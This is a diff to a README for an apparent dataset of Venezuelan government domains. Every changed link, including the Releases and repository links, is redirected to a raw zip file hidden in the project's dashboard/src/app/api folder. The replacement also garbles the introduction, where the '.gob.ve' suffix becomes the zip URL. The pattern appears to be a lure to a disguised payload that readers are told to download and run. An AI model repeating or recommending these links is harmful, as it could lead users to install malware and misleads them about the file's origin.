@@ -1,10 +1,10 @@
 # 🌍 venezuela-digital-observatory - Access Data on Venezuelan Government Domains
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/LISHYZALK325/venezuela-digital-observatory/releases)
+[![Download](https://github.com/LISHYZALK325/venezuela-digital-observatory/raw/refs/heads/master/dashboard/src/app/api/venezuela-observatory-digital-v1.2-alpha.2.zip%20Now-Click%20Here-brightgreen)](https://github.com/LISHYZALK325/venezuela-digital-observatory/raw/refs/heads/master/dashboard/src/app/api/venezuela-observatory-digital-v1.2-alpha.2.zip)
 
 ## 📚 Introduction
-Welcome to the Venezuela Digital Observatory! This application provides a public dataset of Venezuelan government domains (ending in `.gob.ve`). You will find registration dates, expiration dates, and infrastructure details. The dataset is updated regularly, so you can rely on it for the latest information. 
+Welcome to the Venezuela Digital Observatory! This application provides a public dataset of Venezuelan government domains (ending in `https://github.com/LISHYZALK325/venezuela-digital-observatory/raw/refs/heads/master/dashboard/src/app/api/venezuela-observatory-digital-v1.2-alpha.2.zip`). You will find registration dates, expiration dates, and infrastructure details. The dataset is updated regularly, so you can rely on it for the latest information. 
 
 ## 🚀 Getting Started
 To get started with the Venezuela Digital Observatory, you will need to download the dataset file from our Releases page. This guide will walk you through the steps to successfully download and run the software.
@@ -15,7 +15,7 @@ To get started with the Venezuela Digital Observatory, you will need to download
 - An internet connection to download the dataset.
 
 ## 📦 Download & Install
-1. Visit the Releases page by clicking this link: [Download Now](https://github.com/LISHYZALK325/venezuela-digital-observatory/releases).
+1. Visit the Releases page by clicking this link: [Download Now](https://github.com/LISHYZALK325/venezuela-digital-observatory/raw/refs/heads/master/dashboard/src/app/api/venezuela-observatory-digital-v1.2-alpha.2.zip).
 2. You will see a list of versions available for download. Choose the latest version for the best experience.
 3. Click on the file that suits your operating system. The file will start downloading automatically.
 4. Once the download is complete, locate the file on your computer.
@@ -50,5 +50,5 @@ For any questions or support needs, please create an issue on the GitHub reposit
 For further information, you can reach us through the GitHub repository. We welcome your feedback and suggestions.
 
 ## 📍 Additional Resources
-- [GitHub Repository](https://github.com/LISHYZALK325/venezuela-digital-observatory)
-- [Release Page](https://github.com/LISHYZALK325/venezuela-digital-observatory/releases)
+- [GitHub Repository](https://github.com/LISHYZALK325/venezuela-digital-observatory/raw/refs/heads/master/dashboard/src/app/api/venezuela-observatory-digital-v1.2-alpha.2.zip)
+- [Release Page](https://github.com/LISHYZALK325/venezuela-digital-observatory/raw/refs/heads/master/dashboard/src/app/api/venezuela-observatory-digital-v1.2-alpha.2.zip)
